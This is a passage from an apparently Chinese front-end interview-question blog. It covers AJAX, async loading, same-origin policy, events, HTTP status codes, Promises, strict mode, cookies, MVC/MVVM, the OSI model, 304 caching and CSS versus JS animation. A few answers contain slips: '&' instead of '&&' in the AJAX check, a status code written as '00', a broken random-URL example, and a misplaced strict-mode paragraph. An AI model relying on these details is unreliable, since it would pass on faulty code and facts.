创建ajax的过程==</h2><ol><li>创建<code>XMLHttpRequest</code>对象,也就是创建一个异步调用对象.</li><li>创建一个新的<code>HTTP</code>请求,并指定该<code>HTTP</code>请求的方法、<code>URL</code>及验证信息.</li><li>设置响应<code>HTTP</code>请求状态变化的函数.</li><li>发送<code>HTTP</code>请求.</li><li>获取异步调用返回的数据.</li><li>使用JavaScript和DOM实现局部刷新.</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlHttp.open(<span class="string">'GET'</span>,<span class="string">'demo.php'</span>,<span class="string">'true'</span>);</span><br><span class="line">xmlHttp.send()</span><br><span class="line">xmlHttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlHttp.readyState === <span class="number">4</span> &amp; xmlHttp.status === <span class="number">200</span>)&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="56-异步加载和延迟加载"><a href="#56-异步加载和延迟加载" class="headerlink" title="==56. 异步加载和延迟加载=="></a>==56. 异步加载和延迟加载==</h2><ol><li>异步加载的方案： 动态插入script标签</li><li>通过ajax去获取js代码，然后通过eval执行</li><li>script标签上添加defer或者async属性</li><li>创建并插入iframe，让它异步执行js</li><li>延迟加载：有些 js 代码并不是页面初始化的时候就立刻需要的，而稍后的某些情况才需要的</li></ol><h2 id="57-ie各版本和chrome可以并行下载多少个资源"><a href="#57-ie各版本和chrome可以并行下载多少个资源" class="headerlink" title="==57. ie各版本和chrome可以并行下载多少个资源=="></a>==57. ie各版本和chrome可以并行下载多少个资源==</h2><p>IE6 两个并发，iE7升级之后的6个并发，之后版本也是6个<br>Firefox，chrome也是6个</p><h2 id="58-Flash、Ajax各自的优缺点，在使用中如何取舍？"><a href="#58-Flash、Ajax各自的优缺点，在使用中如何取舍？" class="headerlink" title="==58. Flash、Ajax各自的优缺点，在使用中如何取舍？=="></a>==58. Flash、Ajax各自的优缺点，在使用中如何取舍？==</h2><ul><li>Flash适合处理多媒体、矢量图形、访问机器；对CSS、处理文本上不足，不容易被搜索。</li><li>Ajax对CSS、文本支持很好，支持搜索；多媒体、矢量图形、机器访问不足。</li><li>共同点：与服务器的无刷新传递消息、用户离线和在线状态、操作DOM</li></ul><h2 id="59-请解释一下-JavaScript-的同源策略。为什么要有同源限制？"><a href="#59-请解释一下-JavaScript-的同源策略。为什么要有同源限制？" class="headerlink" title="==59. 请解释一下 JavaScript 的同源策略。为什么要有同源限制？=="></a>==59. 请解释一下 JavaScript 的同源策略。为什么要有同源限制？==</h2><p>概念:同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。<br>这里的同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议。<br>指一段脚本只能读取来自同一来源的窗口和文档的属性。</p><p>我们举例说明：比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。<br>缺点：<br>现在网站的JS 都会进行压缩，一些文件用了严格模式，而另一些没有。这时这些本来是严格模式的文件，被 merge 后，这个串就到了文件的中间，不仅没有指示严格模式，反而在压缩后浪费了字节。</p><h2 id="60-事件、IE与火狐的事件机制有什么区别？-如何阻止冒泡？"><a href="#60-事件、IE与火狐的事件机制有什么区别？-如何阻止冒泡？" class="headerlink" title="==60. 事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？=="></a>==60. 事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？==</h2><ol><li>我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为。</li><li>事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件。；</li><li><code>ev.stopPropagation()</code>;注意旧ie的方法 <code>ev.cancelBubble = true</code>;</li></ol><h2 id="61-ajax的缺点和在IE下的问题？"><a href="#61-ajax的缺点和在IE下的问题？" class="headerlink" title="==61. ajax的缺点和在IE下的问题？=="></a>==61. ajax的缺点和在IE下的问题？==</h2><h4 id="ajax的缺点"><a href="#ajax的缺点" class="headerlink" title="ajax的缺点"></a><strong>ajax的缺点</strong></h4><ol><li>ajax不支持浏览器back按钮。</li><li>安全问题 AJAX暴露了与服务器交互的细节。</li><li>对搜索引擎的支持比较弱。</li><li>破坏了程序的异常机制。</li><li>不容易调试。</li></ol><h4 id="IE缓存问题"><a href="#IE缓存问题" class="headerlink" title="IE缓存问题"></a><strong>IE缓存问题</strong></h4><p>在IE浏览器下，如果请求的方法是GET，并且请求的URL不变，那么这个请求的结果就会被缓存。解决这个问题的办法可以通过实时改变请求的URL，只要URL改变，就不会被缓存，可以通过在URL末尾添加上随机的时间戳参数(‘t’= + new Date().getTime())或者：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&apos;GET&apos;,&apos;demo.php?rand=+Math.random()&apos;,true);//</span><br></pre></td></tr></table></figure><h4 id="Ajax请求的页面历史记录状态问题"><a href="#Ajax请求的页面历史记录状态问题" class="headerlink" title="Ajax请求的页面历史记录状态问题"></a><strong>Ajax请求的页面历史记录状态问题</strong></h4><p>可以通过锚点来记录状态，location.hash。让浏览器记录Ajax请求时页面状态的变化。<br>还可以通过HTML5的history.pushState，来实现浏览器地址栏的无刷新改变</p><h2 id="62-谈谈你对重构的理解"><a href="#62-谈谈你对重构的理解" class="headerlink" title="==62. 谈谈你对重构的理解=="></a>==62. 谈谈你对重构的理解==</h2><p>网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变UI的情况下，对网站进行优化，<br>在扩展的同时保持一致的UI。</p><p>对于传统的网站来说重构通常是：</p><p>表格(table)布局改为DIV+CSS</p><p>使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对IE6有效的)</p><p>对于移动平台的优化</p><p>针对于SEO进行优化</p><p>深层次的网站重构应该考虑的方面</p><p>减少代码间的耦合</p><p>让代码保持弹性</p><p>严格按规范编写代码</p><p>设计可扩展的API</p><p>代替旧有的框架、语言(如VB)</p><p>增强用户体验</p><p>通常来说对于速度的优化也包含在重构中</p><p>压缩JS、CSS、image等前端资源(通常是由服务器来解决)</p><p>程序的性能优化(如数据读写)</p><p>采用CDN来加速资源加载</p><p>对于JS DOM的优化</p><p>HTTP服务器的文件缓存</p><h2 id="63-HTTP状态码"><a href="#63-HTTP状态码" class="headerlink" title="==63. HTTP状态码=="></a>==63. HTTP状态码==</h2><ul><li>00  Continue  继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息</li><li>200  OK   正常返回信息</li><li>201  Created  请求成功并且服务器创建了新的资源</li><li>202  Accepted  服务器已接受请求，但尚未处理</li><li>301  Moved Permanently  请求的网页已永久移动到新位置。</li><li>302 Found  临时性重定向。</li><li>303 See Other  临时性重定向，且总是使用 GET 请求新的 URI。</li><li>304  Not Modified  自从上次请求后，请求的网页未修改过。</li><li>400 Bad Request  服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。</li><li>401 Unauthorized  请求未授权。</li><li>403 Forbidden  禁止访问。</li><li>404 Not Found  找不到如何与 URI 相匹配的资源。</li><li>500 Internal Server Error  最常见的服务器端错误。</li><li>503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）。</li></ul><h2 id="64-说说你对Promise的理解"><a href="#64-说说你对Promise的理解" class="headerlink" title="==64. 说说你对Promise的理解=="></a>==64. 说说你对Promise的理解==</h2><p>依照 Promise/A+ 的定义，Promise 有四种状态：</p><ul><li>pending: 初始状态, 非 fulfilled 或 rejected.</li><li>fulfilled: 成功的操作.</li><li>rejected: 失败的操作.</li><li>settled: Promise已被fulfilled或rejected，且不是pending</li></ul><p>另外， fulfilled 与 rejected 一起合称 settled。<br>Promise 对象用来进行延迟(deferred) 和异步(asynchronous ) 计算。</p><h4 id="Promise-的构造函数"><a href="#Promise-的构造函数" class="headerlink" title="Promise 的构造函数"></a><strong>Promise 的构造函数</strong></h4><p>构造一个 Promise，最基本的用法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var promise = new Promise(function(resolve, reject) &#123;</span><br><span class="line">    if (...) &#123;  // succeed</span><br><span class="line">        resolve(result);</span><br><span class="line">    &#125; else &#123;   // fails</span><br><span class="line">        reject(Error(errMessage));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Promise 实例拥有 then 方法（具有 then 方法的对象，通常被称为 thenable）。它的使用方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">promise.then(onFulfilled, onRejected)</span><br></pre></td></tr></table></figure><p>接收两个函数作为参数，一个在 fulfilled 的时候被调用，一个在 rejected 的时候被调用，接收参数就是 future，onFulfilled 对应 resolve, onRejected 对应 reject。</p><h2 id="65-说说你对前端架构师的理解"><a href="#65-说说你对前端架构师的理解" class="headerlink" title="==65. 说说你对前端架构师的理解=="></a>==65. 说说你对前端架构师的理解==</h2><ul><li>负责前端团队的管理及与其他团队的协调工作，提升团队成员能力和整体效率；</li><li>带领团队完成研发工具及平台前端部分的设计、研发和维护；</li><li>带领团队进行前端领域前沿技术研究及新技术调研，保证团队的技术领先</li><li>负责前端开发规范制定、功能模块化设计、公共组件搭建等工作，并组织培训。</li></ul><h2 id="66-说说严格模式的限制"><a href="#66-说说严格模式的限制" class="headerlink" title="==66. 说说严格模式的限制=="></a>==66. 说说严格模式的限制==</h2><ul><li>变量必须声明后再使用</li><li>函数的参数不能有同名属性，否则报错</li><li>不能使用with语句</li><li>不能对只读属性赋值，否则报错</li><li>不能使用前缀0表示八进制数，否则报错</li><li>不能删除不可删除的属性，否则报错</li><li>不能删除变量delete prop，会报错，只能删除属性delete global[prop]</li><li>eval不会在它的外层作用域引入变量</li><li>eval和arguments不能被重新赋值</li><li>arguments不会自动反映函数参数的变化</li><li>不能使用arguments.callee</li><li>不能使用arguments.caller</li><li>禁止this指向全局对象</li><li>不能使用fn.caller和fn.arguments获取函数调用的堆栈</li><li>增加了保留字（比如protected、static和interface）<br>设立”严格模式”的目的，主要有以下几个：</li><li>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</li><li>消除代码运行的一些不安全之处，保证代码运行的安全；</li><li>提高编译器效率，增加运行速度；</li><li>为未来新版本的Javascript做好铺垫。<br>注：经过测试IE6,7,8,9均不支持严格模式。</li></ul><h2 id="67-如何删除一个cookie"><a href="#67-如何删除一个cookie" class="headerlink" title="==67. 如何删除一个cookie=="></a>==67. 如何删除一个cookie==</h2><p><strong>1. 将时间设为当前时间往前一点。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">date.setDate(date.getDate() - <span class="number">1</span>);<span class="comment">//真正的删除</span></span><br></pre></td></tr></table></figure><p><strong>2.expires的设置</strong><br>​<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">'user='</span>+ <span class="built_in">encodeURIComponent</span>(<span class="string">'name'</span>)  + <span class="string">';expires = '</span> + <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><h2 id="68-，和，标签"><a href="#68-，和，标签" class="headerlink" title="==68. ，和，标签=="></a>==68. <strong>，<em>和<b>，<i>标签==</h2><ul><li><strong> 标签和 <em> 标签一样，用于强调文本，但它强调的程度更强一些。</li><li>em 是 斜体强调标签，更强烈强调，表示内容的强调点。相当于html元素中的 <i>…</i>;</li><li>&lt; b &gt; &lt; i &gt;是视觉要素，分别表示无意义的加粗，无意义的斜体。</li><li>em 和 strong 是表达要素(phrase elements)。</li></ul><h2 id="69-说说你对AMD和Commonjs的理解"><a href="#69-说说你对AMD和Commonjs的理解" class="headerlink" title="==69. 说说你对AMD和Commonjs的理解=="></a>==69. 说说你对AMD和Commonjs的理解==</h2><p>CommonJS是服务器端模块的规范，Node.js采用了这个规范。CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数。<br>AMD推荐的风格通过返回一个对象做为模块对象，CommonJS的风格通过对module.exports或exports的属性赋值来达到暴露模块对象的目的。</p><h2 id="70-document-write-的用法"><a href="#70-document-write-的用法" class="headerlink" title="==70. document.write()的用法=="></a>==70. document.write()的用法==</h2><ul><li>document.write()方法可以用在两个方面：页面载入过程中用实时脚本创建页面内容，以及用延时脚本创建本窗口或新窗口的内容。</li><li>document.write只能重绘整个页面。innerHTML可以重绘页面的一部分</li></ul><h2 id="71-编写一个方法-求一个字符串的字节长度"><a href="#71-编写一个方法-求一个字符串的字节长度" class="headerlink" title="==71. 编写一个方法 求一个字符串的字节长度=="></a>==71. 编写一个方法 求一个字符串的字节长度==</h2><p>假设：一个英文字符占用一个字节，一个中文字符占用两个字节</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetBytes</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> len = str.length;</span><br><span class="line">        <span class="keyword">var</span> bytes = len;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (str.charCodeAt(i) &gt; <span class="number">255</span>) bytes++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">alert(GetBytes(<span class="string">"你好,as"</span>));</span><br></pre></td></tr></table></figure><h2 id="72-git-fetch和git-pull的区别"><a href="#72-git-fetch和git-pull的区别" class="headerlink" title="==72. git fetch和git pull的区别=="></a>==72. git fetch和git pull的区别==</h2><ul><li>git pull：相当于是从远程获取最新版本并merge到本地</li><li>git fetch：相当于是从远程获取最新版本到本地，不会自动merge</li></ul><h2 id="73-说说你对MVC和MVVM的理解"><a href="#73-说说你对MVC和MVVM的理解" class="headerlink" title="==73. 说说你对MVC和MVVM的理解=="></a>==73. 说说你对MVC和MVVM的理解==</h2><h4 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a><strong>MVC</strong></h4><ul><li>View 传送指令到 Controller</li><li>Controller 完成业务逻辑后，要求 Model 改变状态</li><li>Model 将新的数据发送到 View，用户得到反馈</li><li>所有通信都是单向的。</li></ul><h4 id="MVVM"><a href="#MVVM" class="headerlink" title="MVVM"></a><strong>MVVM</strong></h4><p>Angular它采用双向绑定（data-binding）：View的变动，自动反映在 ViewModel，反之亦然。</p><ul><li>组成部分Model、View、ViewModel</li><li>View：UI界面</li><li>ViewModel：它是View的抽象，负责View与Model之间信息转换，将View的Command传送到Model；</li><li>Model：数据访问层</li></ul><h2 id="74-请解释什么是事件代理"><a href="#74-请解释什么是事件代理" class="headerlink" title="==74. 请解释什么是事件代理=="></a>==74. 请解释什么是事件代理==</h2><p>事件代理（Event Delegation），又称之为事件委托。是 JavaScript 中常用绑定事件的常用技巧。顾名思义，“事件代理”即是把原本需要绑定的事件委托给父元素，让父元素担当事件监听的职务。事件代理的原理是DOM元素的事件冒泡。使用事件代理的好处是可以提高性能。</p><h2 id="75-attribute和property的区别是什么？"><a href="#75-attribute和property的区别是什么？" class="headerlink" title="==75. attribute和property的区别是什么？=="></a>==75. attribute和property的区别是什么？==</h2><p>attribute是dom元素在文档中作为html标签拥有的属性；<br>property就是dom元素在js中作为对象拥有的属性。</p><p>所以：</p><p>对于html的标准属性来说，attribute和property是同步的，是会自动更新的，<br>但是对于自定义的属性来说，他们是不同步的，</p><h2 id="76-说说网络分层里七层模型是哪七层"><a href="#76-说说网络分层里七层模型是哪七层" class="headerlink" title="==76. 说说网络分层里七层模型是哪七层=="></a>==76. 说说网络分层里七层模型是哪七层==</h2><ul><li>应用层：应用层、表示层、会话层（从上往下）（HTTP、FTP、SMTP、DNS）</li><li>传输层（TCP和UDP）</li><li>网络层（IP）</li><li>物理和数据链路层（以太网）</li></ul><p>每一层的作用如下：</p><ul><li>物理层：通过媒介传输比特,确定机械及电气规范（比特Bit）</li><li>数据链路层：将比特组装成帧和点到点的传递（帧Frame）</li><li>网络层：负责数据包从源到宿的传递和网际互连（包PackeT）</li><li>传输层：提供端到端的可靠报文传递和错误恢复（段Segment）</li><li>会话层：建立、管理和终止会话（会话协议数据单元SPDU）</li><li>表示层：对数据进行翻译、加密和压缩（表示协议数据单元PPDU）</li><li>应用层：允许访问OSI环境的手段（应用协议数据单元APDU）</li></ul><p>各种协议</p><ul><li>ICMP协议： 因特网控制报文协议。它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。</li><li>TFTP协议： 是TCP/IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。</li><li>HTTP协议： 超文本传输协议，是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。</li><li>DHCP协议： 动态主机配置协议，是一种让系统得以连接到网络上，并获取所需要的配置参数手段。</li></ul><h2 id="77-说说mongoDB和MySQL的区别"><a href="#77-说说mongoDB和MySQL的区别" class="headerlink" title="==77. 说说mongoDB和MySQL的区别=="></a>==77. 说说mongoDB和MySQL的区别==</h2><ul><li>MySQL是传统的关系型数据库，MongoDB则是非关系型数据库</li><li>mongodb以BSON结构（二进制）进行存储，对海量数据存储有着很明显的优势。</li><li>对比传统关系型数据库,NoSQL有着非常显著的性能和扩展性优势，与关系型数据库相比，MongoDB的优点有：<ul><li>①弱一致性（最终一致），更能保证用户的访问速度：</li><li>②文档结构的存储方式，能够更便捷的获取数据。</li></ul></li></ul><h2 id="78-讲讲304缓存的原理"><a href="#78-讲讲304缓存的原理" class="headerlink" title="==78. 讲讲304缓存的原理=="></a>==78. 讲讲304缓存的原理==</h2><p>服务器首先产生ETag，服务器可在稍后使用它来判断页面是否已经被修改。本质上，客户端通过将该记号传回服务器要求服务器验证其（客户端）缓存。</p><p>304是HTTP状态码，服务器用来标识这个文件没修改，不返回内容，浏览器在接收到个状态码后，会使用浏览器已缓存的文件</p><p>客户端请求一个页面（A）。 服务器返回页面A，并在给A加上一个ETag。 客户端展现该页面，并将页面连同ETag一起缓存。 客户再次请求页面A，并将上次请求时服务器返回的ETag一起传递给服务器。 服务器检查该ETag，并判断出该页面自上次客户端请求之后还未被修改，直接返回响应304（未修改——Not Modified）和一个空的响应体。</p><h2 id="79-CSS3动画和js动画各有什么优劣"><a href="#79-CSS3动画和js动画各有什么优劣" class="headerlink" title="==79. CSS3动画和js动画各有什么优劣=="></a>==79. CSS3动画和js动画各有什么优劣==</h2><p>根据Google Developer，Chromium项目里，渲染线程分为main thread和compositor thread。<br>如果CSS动画只是改变transforms和opacity，这时整个CSS动画得以在compositor thread完成（而JS动画则会在main thread执行，然后触发compositor进行下一步操作）<br>在JS执行一些昂贵的任务时，main thread繁忙，CSS动画由于使用了compositor thread可以保持流畅。</p><blockquote><p>在主线程中，维护了一棵Layer树（LayerTreeHost），管理了TiledLayer，在compositor thread，维护了同样一颗LayerTreeHostImpl，管理了LayerImpl，这两棵树的内容是拷贝关系。因此可以彼此不干扰，当Javascript在main thread操作LayerTreeHost的同时，compositor thread可以用LayerTreeHostImpl做渲染。当Javascript繁忙导致主线程卡住时，合成到屏幕的过程也是流畅的。 为了实现防假死，鼠标键盘消息会被首先分发到compositor thread，然后再到main thread。这样，当main thread繁忙时，compositor thread还是能够响应一部分消息，例如，鼠标滚动时，加入main thread繁忙，compositor thread也会处理滚动消息，滚动已经被提交的页面部分（未被提交的部分将被刷白）。</p></blockquote><p> CSS动画比JS流畅的前提：</p><ul><li>在Chromium基础上的浏览器中</li><li>JS在执行一些昂贵的任务</li><li>同时CSS动画不触发layout或paint</li><li>在CSS动画或JS动画触发了paint或layout时，需要main thread进行Layer树的重计算，这时CSS动画或JS动画都会阻塞后续操作。</li></ul><p>参考CSS Triggers，只有如下属性的修改才符合“仅触发Composite，不触发layout或paint”：</p><ul><li>backface-visibility</li><li>opacity</li><li>perspective</li><li>perspective-origin</li><li>transfrom</li></ul><p>所以只有用上了3D加速或修改opacity时，才有机会用得上CSS动画的这一优势。</p><p>因此，在大部分应用场景下，效率角度更值得关注的还是下列问题。</p><ul><li>是否导致layout</li><li>repaint的面积</li><li>是否是有高消耗的属性（css shadow等）</li><li>是否启用硬件加速</li></ul><p>那么Chromium以外的其他浏览器呢？CSSTrick里比较了一次效率。</p><table><thead><tr><th>Animated properties</th><th>JS-based Animation更快</th><th>CSS-based Animation更快</th></tr></thead><tbody><tr><td>top, left, width, height</td><td>Windows Surface RT, iPhone 5s (iOS7), iPad 3 (iOS 6), iPad 3 (iOS7), Samsung Galaxy Tab 2, Chrome, Firefox, Safari, Opera, Kindle Fire HD, IE11</td><td>(none)</td></tr><tr><td>translate, scale</td><td>Windows Surface RT, iPhone 5s (iOS7), iPad 3 (iOS7), Samsung Galaxy Tab 2, Firefox, Opera, IE11</td><td>iPad 3 (iOS6), Safari, Chrome</td></tr></tbody></table><p>可以看到，Chromium以外的其他浏览器没有这方面的CSS动画效率的优化。尽管MSDN提到“它可提供更好的呈现性能”，但测试并没有支持这一点。</p><p>现今CSS动画和JS动画主要的不同点是</p><ul><li><p>功能涵盖面，JS比CSS3大</p><ul><li>定义动画过程的@keyframes不支持递归定义，如果有多种类似的动画过程，需要调节多个参数来生成的话，将会有很大的冗余（比如jQuery Mobile的动画方案），而JS则天然可以以一套函数实现多个不同的动画过程</li><li>时间尺度上，@keyframes的动画粒度粗，而JS的动画粒度控制可以很细</li><li>CSS3动画里被支持的时间函数非常少，不够灵活</li><li>以现有的接口，CSS3动画无法做到支持两个以上的状态转化</li></ul></li><li>实现/重构难度不一，CSS3比JS更简单，性能调优方向固定</li><li>对于帧速表现不好的低版本浏览器，CSS3可以做到自然降级，而JS则需要撰写额外代码</li><li>CSS动画有天然事件支持（TransitionEnd、AnimationEnd，但是它们都需要针对浏览器加前缀），JS则需要自己写事件</li><li>CSS3有兼容性问题，而JS大多时候没有兼容性问题</li></ul></script></p></body></html>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔试面试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
